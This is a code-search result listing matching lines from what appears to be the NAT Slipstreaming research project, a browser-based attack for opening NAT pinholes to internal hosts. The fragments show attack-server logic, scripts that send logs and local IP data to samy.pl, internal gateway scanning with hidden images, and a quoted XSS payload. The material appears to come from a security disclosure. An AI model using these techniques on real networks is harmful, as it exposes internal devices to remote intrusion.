@@ -1,0 +1,38 @@
+# Query: \\b(5060\\.sh|README\\.md|connect(\\.(php|pl))?|get_size|max_pkt_size\\.pl|monitor|nlog|serv-sip\\.pl|server(\\.php)?|turn\\.sh)\\b
+# Flags: CaseSensitive RegExp
+
+25 results - 5 files
+
+connect.php:
+  8: system("perl /s/natpin/connect.pl $ip $port");
+
+max_pkt_size.pl:
+  165:       # communicated back to browser out-of-band via monitor.php
+  186:       # if we're UDP, let's respond with INVITE (like serv-sip.pl would do)
+
+README.md:
+  390: form.setAttribute('action', 'http://samy.pl:5060') // "http" server on SIP port 5060
+  482: To get the general size of the packet, we send a **large** (6000 byte) HTTP POST with an ID and padding data with a hidden web form to our http://our.attack.server:5060/pktsize. On the attack server, we run a [packet sniffer](https://github.com/samyk/slipstream/blob/main/max_pkt_size.pl) which looks for the boundaries of our packet to determine MTU (Maximum Transmission Unit) size, IP header size, potential IP options, TCP header size, potential TCP options, data packet size, and what portion of the packet we control.
+  484: We also run a [custom server](https://github.com/samyk/slipstream/blob/main/serv-sip.pl) that listens on TCP port 5060, and responds with HTTP traffic to appease the browser so nothing looks fishy on the client side (a server with a malformed response would cause errors in the console, or an incorrectly responding server would keep the status spinner going).
+  526: We manage this by first producing hidden HTML `<img>` tags on the page, all to common gateways (192.168.*.1, 10.0.0.1, and [others](https://github.com/samyk/slipstream/blob/main/server#L159)), along with Javascript `onsuccess` and `onerror` events. Each time an img is written to the page, a timer is started and if the `onsuccess` loads, that means the IP responded with a web server, and if no web server is running but the IP is on the network, it will send a TCP RST (reset, meaning port not open) back, triggering the `onerror`. If no IP exists, no RST is sent and the response will take > 1 second, at which point we know the IP doesn't exist on our network.
+
+serv-sip.pl:
+  32: #$server->send("Message '$message' received", 0, $client);
+
+server.php:
+   325: // called by get_size script tag upon load
+   329: 	nlog(txt)
+   358: 	scr.src = '//samy.pl/natpin/get_size?id=' + rand + '&rand=' + rnd()
+   395: // call from /monitor
+   414: 			nlog(document.getElementById('log').innerHTML)
+   446: 			addScript('//samy.pl/natpin/monitor?id=' + rand + '&port=' + port + '&rnd=' + rnd())
+   483: 	addScript('//samy.pl/natpin/connect?id=' + rand + '&port=' + port)
+   486: // called from /connect (along with some log()s)
+   489: 	nlog(document.getElementById('log').innerHTML)
+   576: 	addScript('//samy.pl/natpin/monitor?id=' + rand + '&port=' + port + '&rnd=' + rnd())
+   721: function nlog(str)
+   723: 	post('//samy.pl/natpin/nlog', str)
+   761: 		nlog(sc.currentTarget.localDescription.sdp)
+   796: 		// only do this if using a stun server as we'll get multiple responses
+   961: 			sock.connect(new java.net.InetSocketAddress(document.domain, (!document.location.port)?80:document.location.port))
+  1026: // to fix DOM-based XSS issues - https://samy.pl/slipstream/server?localip=1.1.1.1<img src onerror%3dalert(1)>
